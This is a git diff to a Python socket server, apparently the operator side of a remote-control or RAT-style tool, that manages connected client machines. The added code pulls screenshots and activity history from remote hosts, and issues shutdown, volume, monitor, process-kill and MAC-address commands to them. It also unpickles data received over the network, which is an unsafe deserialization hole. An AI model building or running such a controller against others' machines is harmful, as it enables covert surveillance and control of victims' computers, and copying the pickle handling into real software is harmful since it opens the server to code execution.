@@ -6,6 +6,7 @@ import time
 from PIL import Image
 import os
 import sys
+import pickle
 
 LOCATION = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
 
@@ -47,11 +48,6 @@ class CCA_SERVER:
     def __init__(self, host, port):
         self.host = host
         self.port = port
-
-    def result(self, client):
-        client.send(command.encode())
-        result_output = client.recv(1024).decode()
-        print(result_output)
 
     def banner(self):
         print(
@@ -131,6 +127,9 @@ ________/\\\\\\\\\________/\\\\\\\\\_____/\\\\\\\\\____
             if current_client:
                 command = input(f'> connected to {current_client} > ')
                 client_store[current_client]['commands'].append(command)
+                if current_client and 'quit' in command:
+                    current_client = None 
+
             else:
                 command = input('> ')
 
@@ -150,16 +149,41 @@ ________/\\\\\\\\\________/\\\\\\\\\_____/\\\\\\\\\____
                     parse = command.split(' ')
                     current_client = parse[-1]
 
-                elif current_client and 'quit' in command:
-                    current_client = None 
+                elif 'quit' in command:
+                    print(f'{INFO} Terminating server connection!')
+                    server_socket.close()
+                    break
 
                 else:
                     print(f"{WARNING}: {command} is not a valid command!")
 
+    def getTS(self):
+        return str(int(time.time()))
+
+    def receive_scrn(self, client):
+        try:
+            img_path = os.path.join(LOCATION, f'scrn/host__{self.getTS()}.npy')
+            file = open(img_path, 'wb')
+            data = client.recv(1024)
+            file.write(data)
+            while data != b'':
+                data = client.recv(1024)
+                file.write(data)
+                if len(data) < 1024:
+                    break
+            file.close()
+            o_file = np.load(img_path)
+            pil_img = Image.fromarray(np.uint8(o_file)).convert('RGB')
+            pil_img.show()
+            print(f"{SUCCESS}: screenshot received")
+        except:
+            print(f"{WARNING}: screenshot failed")
+            server_socket.close()
+
     def result(self, client):
         client.send(command.encode())
         result_output = client.recv(1024).decode()
-        print(result_output)
+        print('\n' + result_output)
 
     def handle_client(self, client_id):
         print(f"\n{INFO} Connected to: {client_store[client_id]['address']}")
@@ -168,44 +192,56 @@ ________/\\\\\\\\\________/\\\\\\\\\_____/\\\\\\\\\____
             s = client_store[client_id]['socket']
             if len(c) > 0:
                 for com in c:
-                    # TREAT COMMANDS COMING TO CLIENT AND REMOVE THEM
-                    
                     if 'help' in com:
                         self.list_client_commands()
 
                     elif 'mac' in com:
-                        self.result()
+                        self.result(s)
                     
                     elif 'shutdown' in com:
-                        self.result()
+                        self.result(s)
                     
                     elif 'volon' in com:
-                        self.result()
+                        self.result(s)
 
                     elif 'voloff' in com:
-                        self.result()
+                        self.result(s)
 
                     elif 'monon' in com:
-                        self.result()
+                        self.result(s)
                     
                     elif 'monoff' in com:
-                        self.result()
+                        self.result(s)
 
                     elif 'killc' in com:
-                        self.result()
+                        self.result(s)
+                    
+                    elif command == 'quit':
+                        print(f"{INFO} Terminating server connection!")
+                        s.close()
+                        break
+
+                    elif command == 'history':
+                        s.send(command.encode())
+                        result = s.recv(1024 * 10)
+                        result = pickle.loads(result)
+                        for h in result:
+                            print(f"{datetime.fromtimestamp(h)} : {result[h]}")
+
+                    elif command == 'scrn':
+                        s.send(command.encode())
+                        self.receive_scrn(s)
+
+                    else:
+                        print(f"{WARNING}: {command} is not a valid command!")
                     
                     c.remove(com)
 
             time.sleep(0.1)
-        # data = client_socket.recv(1024).decode()
-        # print(data)
-
-    # def commandParse(self, command):
-    #     pass
-
 
     def main(self):
         try:
+            global server_socket
             server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server_socket.bind(ADDR)
         except socket.error as err:
